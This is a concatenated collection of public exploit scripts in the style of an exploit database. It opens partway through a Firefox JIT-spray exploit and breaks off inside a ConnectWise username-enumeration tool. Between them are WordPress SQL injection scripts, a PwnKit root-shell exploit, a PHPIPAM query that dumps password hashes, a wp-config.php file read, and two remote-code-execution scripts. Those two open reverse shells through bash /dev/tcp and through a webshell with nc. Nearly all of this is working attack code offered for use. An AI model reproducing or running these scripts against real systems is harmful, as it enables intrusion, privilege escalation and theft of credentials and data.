        var DblVal = StrongLeakDbl(ScanPtr); // The JIT'd ASM code being scanned is likely to contain 8 byte sequences which will not be interpreted as doubles (and will have tagged pointer bits set). Use explicit/strong primitive for these reads.
        
        if(DblVal == 5.40900888e-315) {
            HelperDbl[0] = ScanPtr;
            HelperDword[0] = HelperDword[0] + 8; // Skip over egg bytes and return precise pointer to the shellcode
            return HelperDbl[0];
        }
        
        HelperDbl[0] = ScanPtr;
        HelperDword[0] = HelperDword[0] + 8;
        ScanPtr = HelperDbl[0];
    }
    
    return 0.0;
}

////////
////////
// Primary high level exploit logic
////////

function CVE_2019_11707() {
    for(var i = 0; i < JITIterations; i++) {
        JITSprayFunc(); // JIT spray the shellcode to a private +RX region of virtual memory
    }

    var JITCodePtr = GetJSFuncJITCodePtr(JITSprayFunc);
    
    if(JITCodePtr) {
        // Setup the strong read primitive for the stage one egg hunter: attempting to interpret assembly byte code as doubles via weak primitive may crash the process (tagged pointer bits could cause the read value to be dereferenced as a pointer)
        
        HelperDbl[0] = JITCodePtr;
        DebugLog("JIT spray code pointer is 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
        InitStrongRWPrimitive();
        ShellcodeAddress = EggHunter(JITCodePtr); // For this we need the strong read primitive since values here can start with 0xffff and thus act as tags

        if(ShellcodeAddress) {
            // Trigger code exec by calling the JIT sprayed function again. Its code pointer has been overwritten to now point to the literal shellcode data within the JIT'd function
            
            HelperDbl[0] = ShellcodeAddress;
            DebugLog("Shellcode pointer is 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
            var JITInfoAddress = GetJSFuncJITInfoPtr(JITSprayFunc);
            WeakWriteDbl(JITInfoAddress, ShellcodeAddress);
            JITSprayFunc(); // Notably the location of the data in the stage two shellcode Uint8Array can be found at offset 0x40 from the start of the array object when the array is small, and when it is large a pointer to it can be found at offset 0x38 from the start of the array object. In this case though, the stage one egg hunter shellcode finds, disables DEP and ADDITIONALLY executes the stage two shellcode itself, so there is no reason to locate/execute it from JS.
        }
        else {
            DebugLog("Failed to resolve shellcode address");
        }
    }
}

CVE_2019_11707();
</script>
</body>
</html>
# Exploit Title: Wordpress Plugin 404 to 301 2.0.2 - SQL-Injection (Authenticated)
# Date 30.01.2022
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://de.wordpress.org/plugins/404-to-301/
# Software Link: https://downloads.wordpress.org/plugin/404-to-301.2.0.2.zip
# Version: <= 2.0.2
# Tested on: Ubuntu 20.04
# CVE: CVE-2015-9323
# CWE: CWE-89
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2015-9323/README.md

'''
Description:
The 404-to-301 plugin before 2.0.3 for WordPress has SQL injection.
'''

banner = '''       
                                            
 .o88b. db    db d88888b        .d888b.  .d88b.   db   ooooo        .d888b. d8888b. .d888b. d8888b.
d8P  Y8 88    88 88'            VP  `8D .8P  88. o88  8P~~~~        88' `8D VP  `8D VP  `8D VP  `8D
8P      Y8    8P 88ooooo           odD' 88  d'88  88 dP             `V8o88'   oooY'    odD'   oooY'
8b      `8b  d8' 88~~~~~ C8888D  .88'   88 d' 88  88 V8888b. C8888D    d8'    ~~~b.  .88'     ~~~b.
Y8b  d8  `8bd8'  88.            j88.    `88  d8'  88     `8D          d8'   db   8D j88.    db   8D
 `Y88P'    YP    Y88888P        888888D  `Y88P'   VP 88oobY'         d8'    Y8888P' 888888D Y8888P'
 
                                                            [+] 404 to 301 - SQL-Injection
                                                            [@] Developed by Ron Jost (Hacker5preme)
                                                        
'''
print(banner)

import argparse
import os
import requests
from datetime import datetime
import json

# User-Input:
my_parser = argparse.ArgumentParser(description='Wordpress Plugin 404 to 301 - SQL Injection')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD

print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))


# Authentication:
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'
check = session.get(auth_url)
# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}
auth = session.post(auth_url, headers=header, data=body)

# SQL-Injection (Exploit):

# Generate payload for sqlmap
print ('[+] Payload for sqlmap exploitation:')
cookies_session = session.cookies.get_dict()
cookie = json.dumps(cookies_session)
cookie = cookie.replace('"}','')
cookie = cookie.replace('{"', '')
cookie = cookie.replace('"', '')
cookie = cookie.replace(" ", '')
cookie = cookie.replace(":", '=')
cookie = cookie.replace(',', '; ')

exploit_url = r'sqlmap -u "http://' + target_ip + ':' + target_port + wp_path + r'wp-admin/admin.php?page=i4t3-logs&orderby=1"'
exploit_risk = ' --level 2 --risk 2'
exploit_cookie = r' --cookie="' + cookie + r'" '

print('    Sqlmap options:')
print('     -a, --all           Retrieve everything')
print('     -b, --banner        Retrieve DBMS banner')
print('     --current-user      Retrieve DBMS current user')
print('     --current-db        Retrieve DBMS current database')
print('     --passwords         Enumerate DBMS users password hashes')
print('     --tables            Enumerate DBMS database tables')
print('     --columns           Enumerate DBMS database table column')
print('     --schema            Enumerate DBMS schema')
print('     --dump              Dump DBMS database table entries')
print('     --dump-all          Dump all DBMS databases tables entries')
retrieve_mode = input('Which sqlmap option should be used to retrieve your information? ')
exploit_code = exploit_url + exploit_risk + exploit_cookie + retrieve_mode + ' -p orderby -v0'
os.system(exploit_code)
print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))
 # Exploit Title: PolicyKit-1 0.105-31 - Privilege Escalation
# Exploit Author: Lance Biggerstaff
# Original Author: ryaagard (https://github.com/ryaagard)
# Date: 27-01-2022
# Github Repo: https://github.com/ryaagard/CVE-2021-4034
# References: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt

# Description: The exploit consists of three files `Makefile`, `evil-so.c` & `exploit.c`

##### Makefile #####

all:
    gcc -shared -o evil.so -fPIC evil-so.c
    gcc exploit.c -o exploit

clean:
    rm -r ./GCONV_PATH=. && rm -r ./evildir && rm exploit && rm evil.so

#################

##### evil-so.c #####

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0);

    execve("/bin/sh", NULL, NULL);
}

#################

##### exploit.c #####

#include <stdio.h>
#include <stdlib.h>

#define BIN "/usr/bin/pkexec"
#define DIR "evildir"
#define EVILSO "evil"

int main()
{
    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=ryaagard",
        "CHARSET=ryaagard",
        NULL
    };
    char *argv[] = { NULL };

    system("mkdir GCONV_PATH=.");
    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
    system("mkdir " DIR);
    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
    system("cp " EVILSO ".so " DIR);

    execve(BIN, argv, envp);

    return 0;
}

#################
  # Exploit Title: WordPress Plugin Modern Events Calendar V 6.1 - SQL Injection (Unauthenticated)
# Date 26.01.2022
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://webnus.net/modern-events-calendar/
# Software Link: https://downloads.wordpress.org/plugin/modern-events-calendar-lite.6.1.0.zip
# Version: <= 6.1
# Tested on: Ubuntu 20.04
# CVE: CVE-2021-24946
# CWE: CWE-89
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24946/README.md

'''
Description:
The Modern Events Calendar Lite WordPress plugin before 6.1.5 does not sanitise and escape the time parameter
before using it in a SQL statement in the mec_load_single_page AJAX action, available to unauthenticated users,
leading to an unauthenticated SQL injection issue
'''

#Banner:
banner = '''

 .oOOOo.  o      'O o.OOoOoo                                                                                   
.O     o  O       o  O                 .oOOo. .oOOo. .oOOo.  oO             .oOOo. o   O  .oOOo. o   O  .oOOo.
o         o       O  o                      O O    o      O   O                  O O   o  O    o O   o  O     
o         o       o  ooOO                   o o    O      o   o                  o o   o  o    O o   o  o     
o         O      O'  O       ooooooooo     O' o    o     O'   O   ooooooooo     O' OooOOo `OooOo OooOOo OoOOo.
O         `o    o    o                    O   O    O    O     o                O       O       O     O  O    O
`o     .o  `o  O     O                  .O    o    O  .O      O              .O        o       o     o  O    o
 `OoooO'    `o'     ooOooOoO           oOoOoO `OooO' oOoOoO OooOO           oOoOoO     O  `OooO'     O  `OooO'
                                                                                                              
                                                        [+] Modern Events Calendar Lite SQL-Injection
                                                        [@] Developed by Ron Jost (Hacker5preme)

'''

print(banner)

import requests
import argparse
from datetime import datetime
import os

# User-Input:
my_parser = argparse.ArgumentParser(description='Wordpress Plugin Modern Events Calendar SQL-Injection (unauthenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH


# Exploit:
print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))
print('[*] Payload for SQL-Injection:')
exploitcode_url = r'sqlmap "http://' + target_ip + ':' + target_port + wp_path + r'wp-admin/admin-ajax.php?action=mec_load_single_page&time=2" '
exploitcode_risk = ' -p time'
print('    Sqlmap options:')
print('     -a, --all           Retrieve everything')
print('     -b, --banner        Retrieve DBMS banner')
print('     --current-user      Retrieve DBMS current user')
print('     --current-db        Retrieve DBMS current database')
print('     --passwords         Enumerate DBMS users password hashes')
print('     --tables            Enumerate DBMS database tables')
print('     --columns           Enumerate DBMS database table column')
print('     --schema            Enumerate DBMS schema')
print('     --dump              Dump DBMS database table entries')
print('     --dump-all          Dump all DBMS databases tables entries')
retrieve_mode = input('Which sqlmap option should be used to retrieve your information? ')
exploitcode = exploitcode_url +  retrieve_mode + exploitcode_risk
os.system(exploitcode)
print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))
# Exploit Title: WordPress Plugin RegistrationMagic V 5.0.1.5 - SQL Injection (Authenticated)
# Date 23.01.2022
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://registrationmagic.com/
# Software Link: https://downloads.wordpress.org/plugin/custom-registration-form-builder-with-submission-manager.5.0.1.5.zip
# Version: <= 5.0.1.5
# Tested on: Ubuntu 20.04
# CVE: CVE-2021-24862
# CWE: CWE-89
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24862/README.md

'''
Description:
The RegistrationMagic WordPress plugin before 5.0.1.6 does not escape user input in its rm_chronos_ajax AJAX action
before using it in a SQL statement when duplicating tasks in batches, which could lead to a SQL injection issue.
'''

# Banner:
import os

banner = '''
                                                                
 _____ _____ _____     ___ ___ ___ ___       ___ ___ ___ ___ ___
|     |  |  |   __|___|_  |   |_  |_  |  ___|_  | | | . |  _|_  |
|   --|  |  |   __|___|  _| | |  _|_| |_|___|  _|_  | . | . |  _|
|_____|\___/|_____|   |___|___|___|_____|   |___| |_|___|___|___|
                                
                           [+] RegistrationMagic SQL Injection
                           [@] Developed by Ron Jost (Hacker5preme)                                                         
'''
print(banner)
import string
import argparse
import requests
from datetime import datetime
import random
import json
import subprocess

# User-Input:
my_parser = argparse.ArgumentParser(description='Wordpress Plugin RegistrationMagic - SQL Injection')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD


print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))

# Authentication:
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'
check = session.get(auth_url)
# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}
auth = session.post(auth_url, headers=header, data=body)

# Create task to ensure duplicate:
dupl_url = "http://" + target_ip + ':' + target_port + wp_path + 'wp-admin/admin.php?page=rm_ex_chronos_edit_task&rm_form_id=2'

# Header:
header = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://" + target_ip + ':' + target_port + "/wp-admin/admin.php?page=rm_ex_chronos_edit_task&rm_form_id=2",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://" + target_ip,
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1"
}

# Body
body = {
    "rmc-task-edit-form-subbed": "yes",
    "rm-task-slide": "on",
    "rmc_task_name": "Exploitdevelopmenthack" + ''.join(random.choice(string.ascii_letters) for x in range(12)),
    "rmc_task_description": "fiasfdhb",
    "rmc_rule_sub_time_older_than_age": '',
    "rmc_rule_sub_time_younger_than_age": '',
    "rmc_rule_fv_fids[]": '',
    "rmc_rule_fv_fvals[]": '',
    "rmc_rule_pay_status[]": "pending",
    "rmc_rule_pay_status[]": "canceled",
    "rmc_action_user_acc": "do_nothing",
    "rmc_action_send_mail_sub": '',
    "rmc_action_send_mail_body": ''
}

# Create project
a = session.post(dupl_url, headers=header, data=body)


# SQL-Injection (Exploit):
exploit_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-admin/admin-ajax.php'

# Generate payload for sqlmap
print ('[+] Payload for sqlmap exploitation:')
cookies_session = session.cookies.get_dict()
cookie = json.dumps(cookies_session)
cookie = cookie.replace('"}','')
cookie = cookie.replace('{"', '')
cookie = cookie.replace('"', '')
cookie = cookie.replace(" ", '')
cookie = cookie.replace(":", '=')
cookie = cookie.replace(',', '; ')
exploitcode_url = "sqlmap -u http://" + target_ip + ':' + target_port + wp_path + 'wp-admin/admin-ajax.php'
exploitcode_risk = ' --level 2 --risk 2 --data="action=rm_chronos_ajax&rm_chronos_ajax_action=duplicate_tasks_batch&task_ids%5B%5D=2"'
exploitcode_cookie = ' --cookie="' + cookie + '"'
print('    Sqlmap options:')
print('     -a, --all           Retrieve everything')
print('     -b, --banner        Retrieve DBMS banner')
print('     --current-user      Retrieve DBMS current user')
print('     --current-db        Retrieve DBMS current database')
print('     --passwords         Enumerate DBMS users password hashes')
print('     --tables            Enumerate DBMS database tables')
print('     --columns           Enumerate DBMS database table column')
print('     --schema            Enumerate DBMS schema')
print('     --dump              Dump DBMS database table entries')
print('     --dump-all          Dump all DBMS databases tables entries')
retrieve_mode = input('Which sqlmap option should be used to retrieve your information? ')
exploitcode = exploitcode_url + exploitcode_risk + exploitcode_cookie + ' ' + retrieve_mode + ' -p task_ids[] -v 0'
os.system(exploitcode)
print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))
 # Exploit Title: PHPIPAM 1.4.4 - SQLi (Authenticated)
# Google Dork: [if applicable]
# Date: 20/01/2022
# Exploit Author: Rodolfo "Inc0gbyt3" Tavares
# Vendor Homepage: https://github.com/phpipam/phpipam
# Software Link: https://github.com/phpipam/phpipam
# Version: 1.4.4
# Tested on: Linux/Windows
# CVE : CVE-2022-23046

import requests
import sys
import argparse

################
"""
Author of exploit: Rodolfo 'Inc0gbyt3' Tavares
CVE: CVE-2022-23046
Type: SQL Injection

Usage:

$ python3 -m pip install requests
$ python3 exploit.py -u http://localhost:8082 -U <admin> -P <password>
"""
###############

__author__ = "Inc0gbyt3"

menu = argparse.ArgumentParser(description="[+] Exploit for PHPIPAM Version: 1.4.4 Authenticated SQL Injection\n CVE-2022-23046")
menu.add_argument("-u", "--url", help="[+] URL of target, example: https://phpipam.target.com", type=str)
menu.add_argument("-U", "--user", help="[+] Username", type=str)
menu.add_argument("-P", "--password", help="[+] Password", type=str)
args = menu.parse_args()

if len(sys.argv) < 3:
    menu.print_help()

target = args.url
user = args.user
password = args.password


def get_token():
    u = f"{target}/app/login/login_check.php"

    try:
        r = requests.post(u, verify=False, timeout=10, headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, data={"ipamusername":user, "ipampassword":password})
        headers = r.headers['Set-Cookie']
        headers_string = headers.split(';')
        for s in headers_string:
            if "phpipam" in s and "," in s: # double same cookie Check LoL
                cookie = s.strip(',').lstrip()
                return cookie
    except Exception as e:
        print(f"[+] {e}")


def exploit_sqli():
    cookie = get_token()
    xpl = f"{target}/app/admin/routing/edit-bgp-mapping-search.php"
    data = {
        "subnet":'pwn"union select(select concat(@:=0x3a,(select+count(*) from(users)where(@:=concat(@,email,0x3a,password,"0x3a",2fa))),@)),2,3,user() -- -', # dios query dump all :)
        "bgp_id":1
    }

    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": cookie
    }

    try:
        r = requests.post(xpl, verify=False, timeout=10, headers=headers, data=data)
        if "admin" in r.text or "rounds" in r.text:
            print("[+] Vulnerable..\n\n")
            print(f"> Users and hash passwords: \n\n{r.text}")
            print("\n\n> DONE <")
    except Exception as e:
        print(f"[-] {e}")



if __name__ == '__main__':
    exploit_sqli()
               # Exploit Title: Nyron 1.0 - SQLi (Unauthenticated)
# Google Dork: inurl:"winlib.aspx"
# Date: 01/18/2021
# Exploit Author: Miguel Santareno
# Vendor Homepage: http://www.wecul.pt/
# Software Link: http://www.wecul.pt/solucoes/bibliotecas/
# Version: < 1.0
# Tested on: windows

# 1. Description

Unauthenticated user can exploit SQL Injection vulnerability in thes1 parameter.


# 2. Proof of Concept (PoC)

https://vulnerable_webiste.com/Nyron/Library/Catalog/winlibsrch.aspx?skey=C8AF11631DCA40ADA6DE4C2E323B9989&pag=1&tpp=12&sort=4&cap=&pesq=5&thes1='">


# 3. Research:
https://miguelsantareno.github.io/edp.pdf
  # Exploit Title: Archeevo 5.0 - Local File Inclusion
# Google Dork: intitle:"archeevo"
# Date: 01/15/2021
# Exploit Author: Miguel Santareno
# Vendor Homepage: https://www.keep.pt/
# Software Link: https://www.keep.pt/produtos/archeevo-software-de-gestao-de-arquivos/
# Version: < 5.0
# Tested on: windows

# 1. Description

Unauthenticated user can exploit LFI vulnerability in file parameter.


# 2. Proof of Concept (PoC)

Access a page that don’t exist like /test.aspx and then you will be redirected to
https://vulnerable_webiste.com/error?StatusCode=404&file=~/FileNotFoundPage.html

After that change the file /FileNotFoundPage.html to /web.config and you be able to see the
/web.config file of the application.

https://vulnerable_webiste.com/error?StatusCode=404&file=~/web.config


# 3. Research:
https://miguelsantareno.github.io/MoD_1.pdf
# Exploit Title: Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)
# Date: 03/01/2022
# Exploit Author: Jeremiasz Pluta
# Vendor Homepage: https://github.com/Gerapy/Gerapy
# Version: All versions of Gerapy prior to 0.9.8
# CVE: CVE-2021-43857
# Tested on: Gerapy 0.9.6

# Vulnerability: Gerapy prior to version 0.9.8 is vulnerable to remote code execution. This issue is patched in version 0.9.8.

#!/usr/bin/python
import sys
import re
import argparse
import pyfiglet
import requests
import time
import json
import subprocess

banner = pyfiglet.figlet_format("CVE-2021-43857")
print(banner)
print('Exploit for CVE-2021-43857')
print('For: Gerapy < 0.9.8')

login = "admin" #CHANGE ME IF NEEDED
password = "admin" #CHANGE ME IF NEEDED

class Exploit:

    def __init__(self, target_ip, target_port, localhost, localport):
        self.target_ip = target_ip
        self.target_port = target_port
        self.localhost = localhost
        self.localport = localport

    def exploitation(self):
        payload = """{"spider":"`/bin/bash -c 'bash -i >& /dev/tcp/""" + localhost + """/""" + localport + """ 0>&1'`"}"""

        #Login to the app (getting auth token)
        url = "http://" + target_ip + ":" + target_port
        r = requests.Session()
        print("[*] Resolving URL...")
        r1 = r.get(url)
        time.sleep(3)
        print("[*] Logging in to application...")
        r2 = r.post(url + "/api/user/auth", json={"username":login,"password":password}, allow_redirects=True)
        time.sleep(3)
        if (r2.status_code == 200):
            print('[*] Login successful! Proceeding...')
        else:
            print('[*] Something went wrong!')
            quit()

        #Create a header out of auth token (yep, it's bad as it looks)
        dict = json.loads(r2.text)
        temp_token = 'Token '
        temp_token2 = json.dumps(dict['token']).strip('"')
        auth_token = {}
        auth_token['Authorization'] = temp_token + temp_token2

        #Get the project list
        print("[*] Getting the project list")
        r3 = r.get(url + "/api/project/index", headers=auth_token, allow_redirects=True)
        time.sleep(3)

        if (r3.status_code != 200):
            print("[!] Something went wrong! Maybe the token is corrupted?")
            quit();

        #Parse the project name for a request (yep, it's worse than earlier)
        dict = r3.text # [{'name': 'test'}]
        dict2 = json.dumps(dict)
        dict3 = json.loads(dict2)
        dict3 = json.loads(dict3)
        name = dict3[0]['name']
        print("[*] Found project: " + name)

        #use the id to check the project
        print("[*] Getting the ID of the project to build the URL")
        r4 = r.get(url + "/api/project/" + name + "/build", headers=auth_token, allow_redirects=True)
        time.sleep(3)
        if (r4.status_code != 200):
            print("[*] Something went wrong! I can't reach the found project!")
            quit();

        #format the json to dict
        dict = r4.text
        dict2 = json.dumps(dict)
        dict3 = json.loads(dict2)
        dict3 = json.loads(dict3)
        id = dict3['id']
        print("[*] Found ID of the project: ", id)
        time.sleep(1)

        #netcat listener
        print("[*] Setting up a netcat listener")
        listener = subprocess.Popen(["nc", "-nvlp", self.localport])
        time.sleep(3)

        #exec the payload
        print("[*] Executing reverse shell payload")
        print("[*] Watchout for shell! :)")
        r5 = r.post(url + "/api/project/" + str(id) + "/parse", data=payload, headers=auth_token, allow_redirects=True)
        listener.wait()

        if (r5.status_code == 200):
            print("[*] It worked!")
            listener.wait()
        else:
            print("[!] Something went wrong!")
            listener.terminate()

def get_args():
    parser = argparse.ArgumentParser(description='Gerapy < 0.9.8 - Remote Code Execution (RCE) (Authenticated)')
    parser.add_argument('-t', '--target', dest="url", required=True, action='store', help='Target IP')
    parser.add_argument('-p', '--port', dest="target_port", required=True, action='store', help='Target port')
    parser.add_argument('-L', '--lh', dest="localhost", required=True, action='store', help='Listening IP')
    parser.add_argument('-P', '--lp', dest="localport", required=True, action='store', help='Listening port')
    args = parser.parse_args()
    return args

args = get_args()
target_ip = args.url
target_port = args.target_port
localhost = args.localhost
localport = args.localport

exp = Exploit(target_ip, target_port, localhost, localport)
exp.exploitation()
  # Exploit Title: WordPress Plugin The True Ranker 2.2.2 - Arbitrary File Read (Unauthenticated)
# Date: 23/12/2021
# Exploit Authors: Nicole Sheinin, Liad Levy
# Vendor Homepage: https://wordpress.org/plugins/seo-local-rank/
# Software Link: https://plugins.svn.wordpress.org/seo-local-rank/tags/2.2.2/
# Version: versions <= 2.2.2
# Tested on: MacOS
# CVE: CVE-2021-39312
# Github repo:

#!/usr/bin/env python3

import argparse, textwrap
import requests
import sys

parser = argparse.ArgumentParser(description="Exploit The True Ranker plugin - Read arbitrary files", formatter_class=argparse.RawTextHelpFormatter)                     
group_must = parser.add_argument_group('must arguments')
group_must.add_argument("-u","--url", help="WordPress Target URL (Example: http://127.0.0.1:8080)",required=True)
parser.add_argument("-p","--payload", help="Path to read  [default] ../../../../../../../../../../wp-config.php", default="../../../../../../../../../../wp-config.php",required=False)

args = parser.parse_args()

if len(sys.argv) <= 2:
    print (f"Exploit Usage: ./exploit.py -h [help] -u [url]")         
    sys.exit() 

HOST = args.url
PAYLOAD = args.payload

url = "{}/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php".format(HOST)
payload = "/scripts/simple.php/{}".format(PAYLOAD)


r = requests.post(url,data={'src': payload})
if r.status_code == 200:
  print(r.text)
else:
  print("No exploit found")
  # Exploit Title: Online Admission System 1.0 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 23/12/2021
# Exploit Author: Jeremiasz Pluta
# Vendor Homepage: https://github.com/rskoolrash/Online-Admission-System
# Software Link: https://github.com/rskoolrash/Online-Admission-System
# Tested on: LAMP Stack (Debian 10)

#!/usr/bin/python
import sys
import re
import argparse
import requests
import time
import subprocess

print('Exploit for Online Admission System 1.0 - Remote Code Execution (Unauthenticated)')

path = '/' #change me if the path to the /oas is in the root directory or another subdir

class Exploit:

    def __init__(self, target_ip, target_port, localhost, localport):
        self.target_ip = target_ip
        self.target_port = target_port
        self.localhost = localhost
        self.localport = localport

    def exploitation(self):
        payload = """<?php system($_GET['cmd']); ?>"""
        payload2 = """rm+/tmp/f%3bmknod+/tmp/f+p%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+""" + localhost + """+""" + localport + """+>/tmp/f"""

        url = 'http://' + target_ip + ':' + target_port + path
        r = requests.Session()

        print('[*] Resolving URL...')
        r1 = r.get(url + 'documents.php')
        time.sleep(3)

        #Upload the payload file
        print('[*] Uploading the webshell payload...')
        files = {
        'fpic': ('cmd.php', payload + '\n', 'application/x-php'),
        'ftndoc': ('', '', 'application/octet-stream'),
        'ftcdoc': ('', '', 'application/octet-stream'),
        'fdmdoc': ('', '', 'application/octet-stream'),
        'ftcdoc': ('', '', 'application/octet-stream'),
        'fdcdoc': ('', '', 'application/octet-stream'),
        'fide': ('', '', 'application/octet-stream'),
        'fsig': ('', '', 'application/octet-stream'),
        }
        data = {'fpicup':'Submit Query'}
        r2 = r.post(url + 'documents.php', files=files, allow_redirects=True, data=data)
        time.sleep(3)

        print('[*] Setting up netcat listener...')
        listener = subprocess.Popen(["nc", "-nvlp", self.localport])
        time.sleep(3)

        print('[*] Spawning reverse shell...')
        print('[*] Watchout!')
        r3 = r.get(url + '/studentpic/cmd.php?cmd=' + payload2)
        time.sleep(3)

        if (r3.status_code == 200):
            print('[*] Got shell!')
            while True:
                listener.wait()
        else:
            print('[-] Something went wrong!')
            listener.terminate()

def get_args():
    parser = argparse.ArgumentParser(description='Online Admission System 1.0 - Remote Code Execution (RCE) (Unauthenticated)')
    parser.add_argument('-t', '--target', dest="url", required=True, action='store', help='Target IP')
    parser.add_argument('-p', '--port', dest="target_port", required=True, action='store', help='Target port')
    parser.add_argument('-L', '--listener-ip', dest="localhost", required=True, action='store', help='Local listening IP')
    parser.add_argument('-P', '--localport', dest="localport", required=True, action='store', help='Local listening port')
    args = parser.parse_args()
    return args

args = get_args()
target_ip = args.url
target_port = args.target_port
localhost = args.localhost
localport = args.localport

exp = Exploit(target_ip, target_port, localhost, localport)
exp.exploitation()
  # Exploit Title: ConnectWise Control 19.2.24707 - Username Enumeration
# Date: 17/12/2021
# Exploit Author: Luca Cuzzolin aka czz78
# Vendor Homepage: https://www.connectwise.com/
# Version: vulnerable <= 19.2.24707
# CVE : CVE-2019-16516

# https://github.com/czz/ScreenConnect-UserEnum

from multiprocessing import Process, Queue
from statistics import mean
from urllib3 import exceptions as urlexcept
import argparse
import math
import re
import requests

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


headers = []

def header_function(header_line):
    headers.append(header_line)


def process_enum(queue, found_queue, wordlist, url, payload, failstr, verbose, proc_id, stop, proxy):
    try:
        # Payload to dictionary
        payload_dict = {}
        for load in payload:
            split_load = load.split(":")
            if split_load[1] != '{USER}':
                payload_dict[split_load[0]] = split_load[1]
            else:
                payload_dict[split_load[0]] = '{USER}'

        # Enumeration
        total = len(wordlist)
        for counter, user in enumerate(wordlist):
            user_payload = dict(payload_dict)
            for key, value in user_payload.items():
                if value == '{USER}':
                    user_payload[key] = user

            dataraw = "".join(['%s=%s&' % (key, value) for (key, value) in user_payload.items()])[:-1]
            headers={"Accept": "*/*" , "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"}

